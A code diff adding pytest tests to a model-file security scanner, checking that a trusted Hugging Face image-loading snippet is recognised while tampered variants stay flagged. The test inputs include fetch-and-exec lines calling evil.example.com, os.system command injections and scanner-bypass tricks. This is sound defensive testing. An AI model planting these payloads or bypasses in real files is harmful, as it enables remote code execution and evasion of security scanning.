@@ -1,10 +1,14 @@
+import hashlib
 import json
+from collections.abc import Iterator
 from pathlib import Path
 from typing import Any
 
 import pytest
+from click.testing import CliRunner
 
 from modelaudit.cache import get_cache_manager, reset_cache_manager
+from modelaudit.cli import cli
 from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
 from modelaudit.detectors import network_comm
 from modelaudit.scanner_results import SCAN_OUTCOME_MESSAGE_METADATA_KEY
@@ -25,6 +29,970 @@ def _failed_network_detection_checks(result: Any) -> list[Any]:
         for check in result.checks
         if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
     ]
+
+
+HUGGINGFACE_DOCUMENTATION_IMAGE_EXAMPLE = (
+    "# Model usage\n\n"
+    "```python\n"
+    "from urllib.request import urlopen\n"
+    "from PIL import Image\n"
+    "img = Image.open(urlopen(\n"
+    '    "https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/'
+    'beignets-task-guide.png"\n'
+    "))\n"
+    "```\n"
+)
+
+HUGGINGFACE_DOCUMENTATION_IMAGE_README_FIXTURES = (
+    "timm_mobilenetv3_small_100.lamb_in1k_README.txt",
+    "timm_convnext_femto.d1_in1k_README.txt",
+    "timm_repvgg_a0.rvgg_in1k_README.txt",
+)
+HUGGINGFACE_WHITELIST_POLICY_MODES: tuple[tuple[bool | str | None, bool], ...] = (
+    (None, True),
+    (True, True),
+    (False, False),
+    ("false", False),
+    ("0", False),
+    ("off", False),
+)
+
+
+class _FailingSecretDetectorTextScanner(TextScanner):
+    def collect_embedded_secret_findings(
+        self,
+        *_args: Any,
+        **_kwargs: Any,
+    ) -> list[dict[str, Any]]:
+        raise RuntimeError("controlled trusted-documentation secret detector failure")
+
+
+class _FailingNetworkDetectorTextScanner(TextScanner):
+    def collect_network_communication_findings(
+        self,
+        *_args: Any,
+        **_kwargs: Any,
+    ) -> list[dict[str, Any]]:
+        raise RuntimeError("controlled trusted-documentation network detector failure")
+
+
+def _real_huggingface_image_readme_payload(fixture_name: str, *, crlf: bool) -> bytes:
+    fixture_path = Path(__file__).resolve().parents[1] / "assets" / "huggingface_model_cards" / fixture_name
+    original = fixture_path.read_bytes()
+    assert b"license: apache-2.0" in original.splitlines() or b"license: mit" in original.splitlines()
+    return original.replace(b"\n", b"\r\n") if crlf else original
+
+
+# Fixture SPDX: Apache-2.0; attribution: Ross Wightman and timm.
+# Pinned source: timm/mobilenetv3_small_100.lamb_in1k@1824797e7887cbec1990e4adbd6675960a36c589.
+# Fixture SPDX: Apache-2.0; attribution: timm.
+# Pinned source: timm/convnext_femto.d1_in1k@1e0c02df687c47abf0819e1a4f858293e17e0c50.
+# Fixture SPDX: MIT; attribution: timm.
+# Pinned source: timm/repvgg_a0.rvgg_in1k@e292d220aa8b811232037f8aa6d6c8c552dbd0c0.
+@pytest.mark.parametrize(
+    ("fixture_name", "fixture_license", "lf_size", "lf_sha256", "crlf_size", "crlf_sha256"),
+    [
+        pytest.param(
+            "timm_mobilenetv3_small_100.lamb_in1k_README.txt",
+            "apache-2.0",
+            4386,
+            "3950face80991c4f91fb1ead491d787639e08a737f948fd630dd938ae8f78c18",
+            4531,
+            "d15a41ee108ddfa546bc931a553f108be8e9e0c4c3ff2978dab9ee31ba5193f0",
+            id="mobilenet-apache-2.0",
+        ),
+        pytest.param(
+            "timm_convnext_femto.d1_in1k_README.txt",
+            "apache-2.0",
+            15646,
+            "8be1d036fde8dd8d279b9d0d8d886da58ba5c76e7a59d6da662b89243a51a5e3",
+            15844,
+            "5996269997efd68dfae50ababead126a2b33761510440c1355bf50854c72849d",
+            id="convnext-apache-2.0",
+        ),
+        pytest.param(
+            "timm_repvgg_a0.rvgg_in1k_README.txt",
+            "mit",
+            4515,
+            "76528d32891b0a14087eb2240065094ff2cea9cc04a41ebe7b28311711af830d",
+            4671,
+            "937369705c2ce5d8ef37a7b8b589a997ebdc76b05ad60cb05f1641777e4ebb69",
+            id="repvgg-mit",
+        ),
+    ],
+)
+@pytest.mark.parametrize("crlf", [False, True], ids=["lf", "crlf"])
+def test_text_scanner_real_huggingface_image_readme_preserves_production_security(
+    tmp_path: Path,
+    fixture_name: str,
+    fixture_license: str,
+    lf_size: int,
+    lf_sha256: str,
+    crlf_size: int,
+    crlf_sha256: str,
+    crlf: bool,
+) -> None:
+    fixture_path = Path(__file__).resolve().parents[1] / "assets" / "huggingface_model_cards" / fixture_name
+    original = fixture_path.read_bytes()
+    assert (len(original), hashlib.sha256(original).hexdigest()) == (lf_size, lf_sha256)
+    assert b"license: " + fixture_license.encode() in original.splitlines()
+    assert b"\r" not in original
+
+    payload = original.replace(b"\n", b"\r\n") if crlf else original
+    digest = hashlib.sha256(payload).hexdigest()
+    expected_size, expected_sha256 = (crlf_size, crlf_sha256) if crlf else (lf_size, lf_sha256)
+    assert (len(payload), digest) == (expected_size, expected_sha256)
+
+    benign_path = tmp_path / "README.md"
+    benign_path.write_bytes(payload)
+    benign = TextScanner().scan(str(benign_path))
+    benign_aggregate = scan_model_directory_or_file(str(benign_path), cache_enabled=False)
+    network_checks = [
+        check
+        for check in benign.checks
+        if check.name == "Network Communication Detection"
+        and (check.details.get("function") == "urlopen" or check.details.get("library") == "urllib")
+    ]
+    assert {check.details.get("type") for check in network_checks} == {"network_function", "network_library"}
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert benign.success is True
+    assert determine_exit_code(benign_aggregate) == 0
+
+    # Repoint the sample image at attacker-controlled infrastructure. Byte length is preserved so
+    # the regression proves the URL itself is validated rather than the card's size or digest.
+    # "evilexample.co" is exactly as long as "huggingface.co".
+    malicious_payload = payload.replace(
+        b"https://huggingface.co/datasets/huggingface/documentation-images/",
+        b"https://evilexample.co/datasets/huggingface/documentation-images/",
+    )
+    assert len(malicious_payload) == len(payload)
+    assert malicious_payload != payload
+    malicious_path = tmp_path / "tampered" / "README.md"
+    malicious_path.parent.mkdir()
+    malicious_path.write_bytes(malicious_payload)
+    malicious = TextScanner().scan(str(malicious_path))
+    malicious_aggregate = scan_model_directory_or_file(str(malicious_path), cache_enabled=False)
+    assert malicious.success is False
+    assert any(
+        check.details.get("function") == "urlopen" and check.severity == IssueSeverity.CRITICAL
+        for check in _failed_network_detection_checks(malicious)
+    )
+    assert determine_exit_code(malicious_aggregate) == 1
+
+
+@pytest.mark.parametrize("fixture_name", HUGGINGFACE_DOCUMENTATION_IMAGE_README_FIXTURES)
+@pytest.mark.parametrize("crlf", [False, True], ids=["lf", "crlf"])
+@pytest.mark.parametrize(
+    ("whitelist_value", "whitelist_enabled"),
+    HUGGINGFACE_WHITELIST_POLICY_MODES,
+    ids=["default", "true", "false", "string-false", "string-zero", "string-off"],
+)
+def test_text_scanner_verified_huggingface_readme_respects_whitelist_policy(
+    tmp_path: Path,
+    fixture_name: str,
+    crlf: bool,
+    whitelist_value: bool | str | None,
+    whitelist_enabled: bool,
+) -> None:
+    path = tmp_path / "README.md"
+    path.write_bytes(_real_huggingface_image_readme_payload(fixture_name, crlf=crlf))
+    config: dict[str, Any] = {} if whitelist_value is None else {"use_hf_whitelist": whitelist_value}
+
+    result = TextScanner(config).scan(str(path))
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False, **config)
+    network_checks = [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection"
+        and (check.details.get("function") == "urlopen" or check.details.get("library") == "urllib")
+    ]
+
+    assert {check.details.get("type") for check in network_checks} == {"network_function", "network_library"}
+    if whitelist_enabled:
+        assert result.success is True
+        assert determine_exit_code(aggregate) == 0
+        assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    else:
+        assert result.success is False
+        assert determine_exit_code(aggregate) == 1
+        assert all(check.status == CheckStatus.FAILED for check in network_checks)
+        assert all(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in network_checks)
+
+
+@pytest.mark.parametrize("fixture_name", HUGGINGFACE_DOCUMENTATION_IMAGE_README_FIXTURES)
+@pytest.mark.parametrize("crlf", [False, True], ids=["lf", "crlf"])
+def test_text_scanner_truncated_verified_huggingface_readme_preserves_actionable_findings(
+    tmp_path: Path,
+    fixture_name: str,
+    crlf: bool,
+) -> None:
+    trusted_payload = _real_huggingface_image_readme_payload(fixture_name, crlf=crlf)
+    path = tmp_path / "README.md"
+    path.write_bytes(trusted_payload + b"\n```python\n__import__('os').system('id')\n```\n")
+    config: dict[str, Any] = {"text_content_scan_bytes": len(trusted_payload)}
+    cache_dir = tmp_path / "cache"
+
+    result = TextScanner(config).scan(str(path))
+    reset_cache_manager()
+    try:
+        aggregates = [
+            scan_model_directory_or_file(
+                str(path),
+                cache_enabled=cache_enabled,
+                cache_dir=str(cache_dir),
+                min_cache_file_size=0,
+                **config,
+            )
+            for cache_enabled in (False, True, True)
+        ]
+        network_checks = [
+            check
+            for check in result.checks
+            if check.name == "Network Communication Detection"
+            and (check.details.get("function") == "urlopen" or check.details.get("library") == "urllib")
+        ]
+
+        assert result.success is False
+        assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+        assert result.metadata.get("analysis_incomplete") is True
+        assert result.metadata.get("operational_error_reason") == "text_content_security_scan_incomplete"
+        assert {check.details.get("type") for check in network_checks} == {"network_function", "network_library"}
+        assert all(check.status == CheckStatus.FAILED for check in network_checks)
+        assert all(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in network_checks)
+        assert all(determine_exit_code(aggregate) == 2 for aggregate in aggregates)
+        assert all(
+            aggregate.file_metadata[str(path)].get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+            for aggregate in aggregates
+        )
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+@pytest.mark.parametrize("fixture_name", HUGGINGFACE_DOCUMENTATION_IMAGE_README_FIXTURES)
+@pytest.mark.parametrize("crlf", [False, True], ids=["lf", "crlf"])
+@pytest.mark.parametrize(
+    ("whitelist_value", "_whitelist_enabled"),
+    HUGGINGFACE_WHITELIST_POLICY_MODES,
+    ids=["default", "true", "false", "string-false", "string-zero", "string-off"],
+)
+def test_text_scanner_verified_huggingface_readme_finding_limit_fails_closed(
+    tmp_path: Path,
+    fixture_name: str,
+    crlf: bool,
+    whitelist_value: bool | str | None,
+    _whitelist_enabled: bool,
+) -> None:
+    path = tmp_path / "README.md"
+    path.write_bytes(_real_huggingface_image_readme_payload(fixture_name, crlf=crlf))
+    config: dict[str, Any] = {"text_content_max_findings": 2}
+    if whitelist_value is not None:
+        config["use_hf_whitelist"] = whitelist_value
+
+    result = TextScanner(config).scan(str(path))
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False, **config)
+    network_checks = [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection"
+        and (check.details.get("function") == "urlopen" or check.details.get("library") == "urllib")
+    ]
+
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("analysis_incomplete") is True
+    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
+    assert determine_exit_code(aggregate) == 2
+    assert {check.details.get("type") for check in network_checks} == {"network_function", "network_library"}
+    assert all(check.status == CheckStatus.FAILED for check in network_checks)
+    assert all(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in network_checks)
+
+
+@pytest.mark.parametrize("crlf", [False, True], ids=["lf", "crlf"])
+@pytest.mark.parametrize(
+    ("whitelist_value", "_whitelist_enabled"),
+    HUGGINGFACE_WHITELIST_POLICY_MODES,
+    ids=["default", "true", "false", "string-false", "string-zero", "string-off"],
+)
+@pytest.mark.parametrize(
+    ("scanner_class", "failed_detector"),
+    [
+        pytest.param(_FailingSecretDetectorTextScanner, "secrets", id="secret-detector"),
+        pytest.param(_FailingNetworkDetectorTextScanner, "network_communication", id="network-detector"),
+    ],
+)
+def test_text_scanner_verified_huggingface_readme_detector_failure_fails_closed(
+    tmp_path: Path,
+    crlf: bool,
+    whitelist_value: bool | str | None,
+    _whitelist_enabled: bool,
+    scanner_class: type[TextScanner],
+    failed_detector: str,
+) -> None:
+    path = tmp_path / "README.md"
+    path.write_bytes(
+        _real_huggingface_image_readme_payload(HUGGINGFACE_DOCUMENTATION_IMAGE_README_FIXTURES[0], crlf=crlf)
+    )
+    config: dict[str, Any] = {} if whitelist_value is None else {"use_hf_whitelist": whitelist_value}
+
+    result = scanner_class(config).scan(str(path))
+
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("analysis_incomplete") is True
+    assert result.metadata.get("operational_error_reason") == "text_content_security_detector_failed"
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("detector") == failed_detector
+        for check in result.checks
+    )
+    if failed_detector == "secrets":
+        network_checks = [
+            check
+            for check in result.checks
+            if check.name == "Network Communication Detection"
+            and (check.details.get("function") == "urlopen" or check.details.get("library") == "urllib")
+        ]
+        assert {check.details.get("type") for check in network_checks} == {"network_function", "network_library"}
+        assert all(check.status == CheckStatus.FAILED for check in network_checks)
+        assert all(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in network_checks)
+
+
+@pytest.mark.parametrize("fixture_name", HUGGINGFACE_DOCUMENTATION_IMAGE_README_FIXTURES)
+@pytest.mark.parametrize("crlf", [False, True], ids=["lf", "crlf"])
+@pytest.mark.parametrize(
+    ("flags", "expected_exit_code"),
+    [
+        pytest.param((), 0, id="default"),
+        pytest.param(("--no-whitelist",), 1, id="no-whitelist"),
+        pytest.param(("--strict",), 1, id="strict"),
+    ],
+)
+def test_text_scanner_verified_huggingface_readme_click_cli_respects_whitelist_policy(
+    tmp_path: Path,
+    fixture_name: str,
+    crlf: bool,
+    flags: tuple[str, ...],
+    expected_exit_code: int,
+) -> None:
+    path = tmp_path / "README.md"
+    path.write_bytes(_real_huggingface_image_readme_payload(fixture_name, crlf=crlf))
+
+    result = CliRunner().invoke(
+        cli,
+        ["scan", str(path), "--format", "json", "--no-cache", *flags],
+        catch_exceptions=False,
+    )
+
+    assert result.exit_code == expected_exit_code, result.output
+
+
+@pytest.mark.parametrize("crlf", [False, True], ids=["lf", "crlf"])
+@pytest.mark.parametrize(
+    ("whitelist_value", "_whitelist_enabled"),
+    HUGGINGFACE_WHITELIST_POLICY_MODES,
+    ids=["default", "true", "false", "string-false", "string-zero", "string-off"],
+)
+def test_text_scanner_passive_documentation_prose_is_not_whitelist_dependent(
+    tmp_path: Path,
+    crlf: bool,
+    whitelist_value: bool | str | None,
+    _whitelist_enabled: bool,
+) -> None:
+    path = tmp_path / "README.md"
+    line_ending = "\r\n" if crlf else "\n"
+    path.write_bytes(f"Documentation: https://docs.example.com/model-card{line_ending}".encode())
+    config: dict[str, Any] = {} if whitelist_value is None else {"use_hf_whitelist": whitelist_value}
+
+    result = TextScanner(config).scan(str(path))
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False, **config)
+    network_checks = [check for check in result.checks if check.name == "Network Communication Detection"]
+
+    assert result.success is True
+    assert determine_exit_code(aggregate) == 0
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+
+
+@pytest.mark.parametrize(
+    "model_name",
+    ["resnet50.a1_in1k", "vit_base_patch16_224.augreg_in21k", "efficientnet_b0.ra_in1k"],
+)
+@pytest.mark.parametrize("crlf", [False, True], ids=["lf", "crlf"])
+def test_text_scanner_unpinned_model_cards_are_informational(
+    tmp_path: Path,
+    model_name: str,
+    crlf: bool,
+) -> None:
+    """The documented example is recognised structurally, not by pinning known files.
+
+    The generator that emits this snippet produces byte-identical code across every card it
+    writes, so recognition must not depend on having seen a particular card before.
+    """
+    example = (
+        "# Model card\n\n"
+        "```python\n"
+        "from urllib.request import urlopen\n"
+        "from PIL import Image\n"
+        "import timm\n\n"
+        "img = Image.open(urlopen(\n"
+        '    "https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/'
+        'beignets-task-guide.png"\n'
+        "))\n"
+        f"model = timm.create_model('{model_name}', pretrained=True)\n"
+        "```\n"
+    )
+    payload = example.replace("\n", "\r\n").encode() if crlf else example.encode()
+    path = tmp_path / "README.md"
+    path.write_bytes(payload)
+
+    result = TextScanner().scan(str(path))
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False)
+    network_checks = [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection"
+        and (check.details.get("function") == "urlopen" or check.details.get("library") == "urllib")
+    ]
+
+    assert {check.details.get("type") for check in network_checks} == {"network_function", "network_library"}
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert result.success is True
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    ("mutation", "replacement"),
+    [
+        pytest.param(
+            "https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/beignets-task-guide.png",
+            "https://evil.example.com/beignets-task-guide.png",
+            id="attacker-controlled-host",
+        ),
+        pytest.param("https://huggingface.co", "http://huggingface.co", id="plain-http"),
+        pytest.param("https://huggingface.co", "https://huggingface.co@evil.example.com", id="url-userinfo"),
+        pytest.param("resolve/main/", "resolve/main/../../", id="path-traversal"),
+        pytest.param("beignets-task-guide.png", "payload.pkl", id="non-image-suffix"),
+        pytest.param("from urllib.request import urlopen", "from urllib.request import urlopen as fetch", id="alias"),
+        pytest.param("img = Image.open(urlopen(", "img = exec(urlopen(", id="response-not-into-image-open"),
+        pytest.param(
+            "from PIL import Image",
+            "from PIL import Image\nimport pickle\nImage.open = pickle.load",
+            id="image-open-rebound",
+        ),
+        pytest.param(
+            "from PIL import Image",
+            "from PIL import Image\ntry:\n    raise RuntimeError()\nexcept RuntimeError as Image:\n    pass",
+            id="image-except-alias",
+        ),
+        pytest.param(
+            "from PIL import Image",
+            "from PIL import Image\nimport builtins\nbuiltins.exec('print(1)')",
+            id="builtins-exec",
+        ),
+        pytest.param(
+            "from PIL import Image",
+            "from PIL import Image\nimport pickle\nimage_module = Image\nimage_module.open = pickle.load",
+            id="image-open-rebound-through-alias",
+        ),
+    ],
+)
+@pytest.mark.parametrize("crlf", [False, True], ids=["lf", "crlf"])
+def test_text_scanner_documentation_image_near_matches_stay_actionable(
+    tmp_path: Path,
+    mutation: str,
+    replacement: str,
+    crlf: bool,
+) -> None:
+    example = HUGGINGFACE_DOCUMENTATION_IMAGE_EXAMPLE.replace(mutation, replacement)
+    if replacement.endswith("as fetch"):
+        example = example.replace("urlopen(\n", "fetch(\n")
+    payload = example.replace("\n", "\r\n").encode() if crlf else example.encode()
+    path = tmp_path / "README.md"
+    path.write_bytes(payload)
+
+    result = TextScanner().scan(str(path))
+
+    assert result.success is False
+    assert any(
+        check.details.get("function") == "urlopen" and check.severity == IssueSeverity.CRITICAL
+        for check in _failed_network_detection_checks(result)
+    )
+
+
+@pytest.mark.parametrize(
+    "injected_code",
+    [
+        pytest.param(
+            "import pickle\n"
+            "class Sink:\n"
+            "    open = staticmethod(pickle.load)\n"
+            "sink = Sink()\n"
+            "match sink:\n"
+            "    case Image:\n"
+            "        pass",
+            id="match-as-image-sink",
+        ),
+        pytest.param(
+            "sink = []\nmatch sink:\n    case [*Image]:\n        pass",
+            id="match-star-image",
+        ),
+        pytest.param(
+            "sink = {}\nmatch sink:\n    case {**Image}:\n        pass",
+            id="match-mapping-rest-image",
+        ),
+        pytest.param(
+            "from builtins import exec as run\nrun(\"print('executed')\")",
+            id="aliased-builtins-exec",
+        ),
+        pytest.param(
+            "from os import system as run\nrun('echo executed')",
+            id="aliased-os-system",
+        ),
+        pytest.param(
+            "from os import *\nsystem('echo executed')",
+            id="wildcard-execution-import",
+        ),
+        pytest.param(
+            "from attacker_helpers import Image",
+            id="protected-image-reimport",
+        ),
+        pytest.param(
+            "from attacker_helpers import urlopen",
+            id="protected-urlopen-reimport",
+        ),
+        pytest.param(
+            "import pickle\nimport PIL.Image as image_module\nimage_module.open = pickle.load",
+            id="protected-image-module-leaf-alias",
+        ),
+        pytest.param(
+            "import pickle\nfrom attacker_helpers import Image as image_module\nimage_module.open = pickle.load",
+            id="protected-image-reexport-leaf-alias",
+        ),
+        pytest.param(
+            "import pickle\nimport PIL\nPIL.Image.open = pickle.load",
+            id="pil-package-image-open-mutation",
+        ),
+        pytest.param(
+            "import pickle\nimport builtins\nimport PIL\nbuiltins.setattr(PIL.Image, 'open', pickle.load)",
+            id="builtins-setattr-image-open",
+        ),
+        pytest.param(
+            "__builtins__.eval(\"setattr(Image, 'open', lambda response: response.read())\")",
+            id="dunder-builtins-eval-image-open",
+        ),
+    ],
+)
+def test_text_scanner_documentation_image_binding_bypasses_stay_actionable(
+    tmp_path: Path,
+    injected_code: str,
+) -> None:
+    payload = HUGGINGFACE_DOCUMENTATION_IMAGE_EXAMPLE.replace(
+        "img = Image.open",
+        f"{injected_code}\nimg = Image.open",
+    ).encode()
+    path = tmp_path / "README.md"
+    path.write_bytes(payload)
+
+    result = TextScanner().scan(str(path))
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False)
+
+    assert any(
+        check.details.get("function") == "urlopen" and check.severity == IssueSeverity.CRITICAL
+        for check in _failed_network_detection_checks(result)
+    )
+    assert any(
+        issue.message == "Network function call detected: urlopen" and issue.severity == IssueSeverity.CRITICAL
+        for issue in aggregate.issues
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "example",
+    [
+        pytest.param(
+            HUGGINGFACE_DOCUMENTATION_IMAGE_EXAMPLE.replace(
+                "))\n```\n",
+                "))\nattacker_urlopen = print\nattacker_urlopen('side effect')\n```\n",
+            ),
+            id="compound-urlopen-identifier",
+        ),
+        pytest.param(
+            HUGGINGFACE_DOCUMENTATION_IMAGE_EXAMPLE.replace(
+                "from urllib.request import urlopen",
+                ("open('PIL.py', 'w').write(\"Image = object\")\nfrom urllib.request import urlopen"),
+            ),
+            id="local-pil-module-before-import",
+        ),
+        pytest.param(
+            HUGGINGFACE_DOCUMENTATION_IMAGE_EXAMPLE.replace(
+                (
+                    "https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/"
+                    "beignets-task-guide.png"
+                ),
+                "https://huggingface.co/attacker/backdoor/resolve/main/logo.png",
+            ),
+            id="attacker-huggingface-repository",
+        ),
+        pytest.param(
+            (
+                "```python\n"
+                "class Namespace(dict):\n"
+                "    def __setitem__(self, key, value):\n"
+                "        dict.update(self, {key: Sink if key == 'Image' else value})\n"
+                "class Meta(type):\n"
+                "    @classmethod\n"
+                "    def __prepare__(cls, name, bases):\n"
+                "        return Namespace()\n"
+                "class Sink:\n"
+                "    @staticmethod\n"
+                "    def open(response):\n"
+                "        return response.read()\n"
+                "class Example(metaclass=Meta):\n"
+                "    from urllib.request import urlopen\n"
+                "    from PIL import Image\n"
+                "    img = Image.open(urlopen(\n"
+                "        'https://huggingface.co/datasets/huggingface/documentation-images/"
+                "resolve/main/beignets-task-guide.png'\n"
+                "    ))\n"
+                "```\n"
+            ),
+            id="metaclass-namespace-replaces-image",
+        ),
+    ],
+)
+def test_text_scanner_documentation_image_trust_boundary_bypasses_stay_actionable(
+    tmp_path: Path,
+    example: str,
+) -> None:
+    path = tmp_path / "README.md"
+    path.write_text(example, encoding="utf-8")
+
+    result = TextScanner().scan(str(path))
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False)
+
+    assert result.success is False
+    assert any(
+        check.details.get("function") == "urlopen" and check.severity == IssueSeverity.CRITICAL
+        for check in _failed_network_detection_checks(result)
+    )
+    assert any(
+        issue.message == "Network function call detected: urlopen" and issue.severity == IssueSeverity.CRITICAL
+        for issue in aggregate.issues
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_urlopen_documentation_fence_validation_is_bounded(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    original_validate = network_comm._is_official_readme_urlopen_image_example
+    validation_calls = 0
+
+    def track_validation(example: bytes) -> bool:
+        nonlocal validation_calls
+        validation_calls += 1
+        return original_validate(example)
+
+    monkeypatch.setattr(
+        network_comm,
+        "_is_official_readme_urlopen_image_example",
+        track_validation,
+    )
+    invalid_fence = b"```python\nurlopen(\n```\n"
+    payload = invalid_fence * (network_comm._MAX_README_IMAGE_EXAMPLE_FENCES + 3)
+
+    assert network_comm.official_readme_urlopen_image_example_spans(payload) == ()
+    assert validation_calls == network_comm._MAX_README_IMAGE_EXAMPLE_FENCES
+
+
+class _CountingSpans(list[tuple[int, int]]):
+    def __init__(self, spans: list[tuple[int, int]]) -> None:
+        super().__init__(spans)
+        self.iterations = 0
+
+    def __iter__(self) -> Iterator[tuple[int, int]]:
+        for span in super().__iter__():
+            self.iterations += 1
+            yield span
+
+
+def test_urlopen_documentation_token_span_checks_are_linear() -> None:
+    tokens = (b"urllib", b"urlopen")
+    segment = b"urllib urlopen " * 16
+    span_count = network_comm._MAX_README_IMAGE_EXAMPLE_FENCES
+    payload = segment * span_count
+    spans = _CountingSpans([(index * len(segment), (index + 1) * len(segment)) for index in range(span_count)])
+
+    assert not network_comm._tokens_appear_outside_spans(payload, tokens, spans)
+    assert spans.iterations <= span_count * len(tokens)
+
+
+def test_urlopen_documentation_spans_are_not_cached_across_scans(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    original_validate = network_comm._is_official_readme_urlopen_image_example
+    validation_calls = 0
+
+    def track_validation(example: bytes) -> bool:
+        nonlocal validation_calls
+        validation_calls += 1
+        return original_validate(example)
+
+    monkeypatch.setattr(
+        network_comm,
+        "_is_official_readme_urlopen_image_example",
+        track_validation,
+    )
+    payload = HUGGINGFACE_DOCUMENTATION_IMAGE_EXAMPLE.encode()
+
+    first_spans = network_comm.official_readme_urlopen_image_example_spans(payload)
+    second_spans = network_comm.official_readme_urlopen_image_example_spans(payload)
+
+    assert first_spans
+    assert second_spans == first_spans
+    assert validation_calls == 2
+
+
+@pytest.mark.parametrize(
+    "unvalidated",
+    [
+        pytest.param(
+            "```python\nfrom urllib.request import urlopen\nurlopen('https://evil.example.com/a')\n```\n",
+            id="second-malicious-fence",
+        ),
+        pytest.param(
+            "```python\nimport urllib.request\nopener = urllib.request.build_opener()\n"
+            "exec(opener.open('http://evil.example.com/payload').read())\n```\n",
+            id="urllib-request-without-urlopen-token",
+        ),
+        pytest.param(
+            "```python\nimport urllib.request\nopener = urllib.request.URLopener()\n```\n",
+            id="urlopener-camelcase-token",
+        ),
+        pytest.param("\nAlso call urlopen('https://evil.example.com') directly.\n", id="prose-urlopen"),
+        pytest.param("\n    urlopen('http://evil.example.com')\n", id="unfenced-urlopen"),
+    ],
+)
+@pytest.mark.parametrize("prepend", [False, True], ids=["appended", "prepended"])
+def test_text_scanner_documentation_image_example_does_not_cover_other_urlopen_uses(
+    tmp_path: Path,
+    unvalidated: str,
+    prepend: bool,
+) -> None:
+    """A proven fence speaks only for itself.
+
+    Suppression keys off byte position, so an unproven ``urlopen`` elsewhere in the file must
+    disable the downgrade rather than shelter behind the documented example's finding position.
+    """
+    trusted = HUGGINGFACE_DOCUMENTATION_IMAGE_EXAMPLE
+    payload = (unvalidated + trusted if prepend else trusted + unvalidated).encode()
+    path = tmp_path / "README.md"
+    path.write_bytes(payload)
+
+    result = TextScanner().scan(str(path))
+
+    assert result.success is False
+    assert any(
+        check.details.get("function") == "urlopen" and check.severity == IssueSeverity.CRITICAL
+        for check in _failed_network_detection_checks(result)
+    )
+
+
+def _documentation_image_example_payload(*, crlf: bool = False) -> bytes:
+    payload = HUGGINGFACE_DOCUMENTATION_IMAGE_EXAMPLE.encode()
+    return payload.replace(b"\n", b"\r\n") if crlf else payload
+
+
+@pytest.mark.parametrize(
+    "filename",
+    ["README.md", "README.markdown", "README.en.md", "model_card.md", "modelcard.markdown"],
+)
+@pytest.mark.parametrize("crlf", [False, True], ids=["lf", "crlf"])
+def test_text_scanner_verified_huggingface_image_documentation_is_informational(
+    tmp_path: Path,
+    filename: str,
+    crlf: bool,
+) -> None:
+    payload = _documentation_image_example_payload(crlf=crlf)
+    text_path = tmp_path / filename
+    text_path.write_bytes(payload)
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+    network_checks = [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection"
+        and (check.details.get("function") == "urlopen" or check.details.get("library") == "urllib")
+    ]
+
+    assert {check.details.get("type") for check in network_checks} == {"network_function", "network_library"}
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert result.success is True
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    "attack",
+    [
+        pytest.param(
+            "```python\nimport torch\ntorch.hub.load('attacker/repo', 'payload', trust_repo=True)\n```\n",
+            id="fenced-hub-load",
+        ),
+        pytest.param(
+            "```python\nfrom torch.hub import load as fetch\nfetch('attacker/repo', 'payload', trust_repo=True)\n```\n",
+            id="aliased-hub-load",
+        ),
+        pytest.param(
+            "    @__import__('os').system('id')\n    def activate():\n        pass\n",
+            id="unfenced-executable-decorator",
+        ),
+        pytest.param(
+            "    (__import__\n    ('os')\n    .system\n    ('id'))\n",
+            id="multiline-unfenced-execution",
+        ),
+        pytest.param(
+            "    (print := eval)\n    print(\"__import__('os').system('id')\")\n",
+            id="protected-callable-rebinding",
+        ),
+        pytest.param(
+            "```bash\nenv python -c \"__import__('os').system('id')\"\n```\n",
+            id="wrapped-shell-execution",
+        ),
+        pytest.param(
+            '```bash\n"python" "-c" "__import__(\'os\').system(\'id\')"\n```\n',
+            id="quoted-shell-execution",
+        ),
+        pytest.param(
+            "```bibtex\n@misc{x}\ntrue && python -c \"__import__('os').system('id')\"\n{}\n```\n",
+            id="forged-bibliography",
+        ),
+        pytest.param(
